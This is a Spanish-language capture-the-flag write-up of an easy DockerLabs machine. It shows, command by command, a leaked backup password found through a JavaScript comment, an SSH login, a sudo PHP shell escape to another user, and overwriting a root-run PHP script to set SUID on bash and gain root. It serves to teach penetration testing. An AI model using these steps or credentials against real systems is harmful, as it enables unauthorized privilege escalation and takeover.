---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Fácil
VectorInicial: Information Disclosure (.env exposed via JS)
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
 - balu: balubalulerobalulei
Usuarios:
 - balu
 - chocolate
 - root
Privesc:
 - Configuración incorrecta de sudo (PHP a chocolate)
 - Script con permisos de escritura ejecutado por root (cron-like)
 - Escalada de privilegios SUID
Tecnicas:
 - Enumeración de directorios
 - Análisis de JavaScript
 - Divulgación de información
 - Reutilización de credenciales
 - Acceso SSH
 - Escalada de privilegios con sudo
 - Supervisión de procesos
 - Aprovechamiento de scripts modificables
 - Abuso de SUID
Herramientas:
 - gomap
 - gobuster
 - ssh
 - sudo
 - ps
Fecha: 2026-03-31
---
<img width="918" height="524" alt="Pasted image 20260330160921" src="https://github.com/user-attachments/assets/f7a87ac1-8d22-4cf1-9b83-f9f4ba8dcefe" />

Empezaremos con una enumeración de los puertos abiertos para ver contra qué nos enfrentamos.

```bash
 gomap -s $TARGET

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 172.17.0.2 (996 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 8.2p1 Ubuntu-4ubuntu0.11
80      open   http            Apache 2.4.41 (Ubuntu)

Host Exposure Summary
- 172.17.0.2 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 45ms | hosts: 1 | open ports: 2
```

Disponemos de dos puertos abiertos:
- 22 para conexión `ssh`
- 80 para conexión `http` vía web

Veamos que tenemos en el puerto `80`.

A simple vista es una web para indicarnos las bondades de un gran perrito.

Procedamos a una enumeración de ficheros y directorios a ver qué encontramos.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 9487]
script.js            (Status: 200) [Size: 2822]
imagenes.js          (Status: 200) [Size: 398]
server-status        (Status: 403) [Size: 275]
whoami               (Status: 301) [Size: 309] [--> http://172.17.0.2/whoami/]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Tenemos 2 ficheros `javascript` los cuales pueden ser interesantes, veamos que contienen.

En el fichero `script.js` encontramos una anotación interesante.

```javascript
    // Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
    console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
    let lastScrollTop = 0;
    const header = document.querySelector('header');
```

Así que, como no podía ser de otra manera, veamos qué hay dentro del fichero `.env_de_baluchingon`.

```txt
RECOVERY LOGIN

balu:balubalulerobalulei
```

Con esto ya tenemos acceso a la máquina para conectarnos por `ssh`.

```bash
 ssh balu@$TARGET                                             
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:UjQK384LFBMaXowGIlQpRBsUtzEYVMwhTHbjwLP4qMA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
balu@172.17.0.2's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.18.12+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Sep 28 15:18:39 2024 from 172.17.0.1
balu@6608f28c5023:~$ ls
balu@6608f28c5023:~$ whoami
balu
balu@6608f28c5023:~$ 
```

Bien, ahora que tenemos acceso a la máquina, vamos a ver si podemos escalar privilegios.

```bash
balu@6608f28c5023:~$ sudo -l
Matching Defaults entries for balu on 6608f28c5023:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on 6608f28c5023:
    (chocolate) NOPASSWD: /usr/bin/php
balu@6608f28c5023:~$ sudo -u chocolate php -r 'system("/bin/sh -i");'
$ whoami
chocolate
$ /bin/bash
chocolate@6608f28c5023:/home/balu$ cd
chocolate@6608f28c5023:~$ ls
chocolate@6608f28c5023:~$ whoami
chocolate
chocolate@6608f28c5023:~$ 
```

Encontramos el primer punto vulnerable para la escalada de privilegios gracias al comando `php` que se puede usar como el usuario **chocolate** y así acceder como este lo cual es un `pivoting` de usuario.

```bash
chocolate@2c290f93492c:/home$ find / -perm -4000 2>/dev/null 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo

chocolate@2c290f93492c:/home$ sudo -l
[sudo] password for chocolate: 
chocolate@2c290f93492c:/home$ 
```

Después de probar un par de cosas vemos que no hay un resultado viable. Además, como no sabemos la contraseña de `chocolate`, tampoco podemos usar el comando `sudo`.

Inspeccionemos los procesos que hay en ejecución a ver si `root` nos enseña algo.

```bash
chocolate@2c290f93492c:/home$ ps aux | grep root
root           1  0.0  0.0   2624  1588 ?        Ss   06:38   0:00 /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done
root          26  0.0  0.2 201404 22904 ?        Ss   06:38   0:00 /usr/sbin/apache2 -k start
root          50  0.0  0.0  12204  4592 ?        Ss   06:38   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          61  0.0  0.1  13412  8800 ?        Ss   06:39   0:00 sshd: balu [priv]
root          89  0.0  0.0   7504  4380 pts/0    S    06:39   0:00 sudo -u chocolate php -r system("/bin/sh -i");
root         291  0.0  0.0   2524  1488 ?        S    06:47   0:00 sleep 5
chocola+     293  0.0  0.0   5204  2248 pts/0    S+   06:47   0:00 grep --color=auto root

chocolate@2c290f93492c:/home$ ls -la /opt/script.php
-rw-r--r-- 1 chocolate chocolate 59 May  7  2024 /opt/script.php
```

Aquí tenemos algo interesante: el usuario `root` tiene un proceso que se ejecuta cada 5 segundos y que llama al script `/opt/script.php`.

Según los permisos de este script podemos editarlo ya que somos el usuario `chocolate`.

Actualmente el fichero contiene solo un pequeño texto.

```php
<?php echo 'Script de pruebas en fase de beta testing'; ?>
```

Pero, al igual que se puede usar **PHP** para conseguir una *web shell*, usaremos la ejecución de comandos para obtener acceso como `root`.

Para ese cometido cambiaremos el contenido del script.

```bash
chocolate@2c290f93492c:/home$ echo "<?php system('chmod u+s /bin/bash'); ?>" > /opt/script.php
chocolate@2c290f93492c:/home$ cat /opt/script.php                                             
<?php system('chmod u+s /bin/bash'); ?>
```

Ahora, una vez pasados 5 segundos, tendremos el **SUID** establecido en **/bin/bash** y lo podremos usar para acceder como `root`.

```bash
chocolate@2c290f93492c:/home$ find / -perm -4000 2>/dev/null 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/bash
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
chocolate@2c290f93492c:/home$ bash -p
bash-5.0# whoami
root
bash-5.0#
```

Usando el comando `bash -p` le indicamos al sistema que nos facilite una *bash* pero con `privilegios`; de esta manera obtenemos una `bash` como `root`.

Con esto finalizamos el laboratorio.

Como podemos observar no siempre encontraremos los mismos métodos de acceso o de escalada.

Este laboratorio nos enseña que, a partir de procesos en segundo plano, podemos encontrar una vía para comprometer la máquina.
